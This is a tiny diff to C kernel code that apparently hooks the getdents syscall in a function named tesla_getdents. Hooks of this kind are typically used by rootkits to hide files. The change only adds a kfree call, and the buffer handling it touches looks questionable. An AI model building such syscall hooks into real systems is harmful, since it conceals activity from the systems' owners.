@@ -63,6 +63,7 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 	if(copy_to_user(p1, dirp, count) != 0) {
 		return -EACCES;
 	}
+	kfree(p1);
 	return orig_getdents(fd, dirp, count);
 }
 
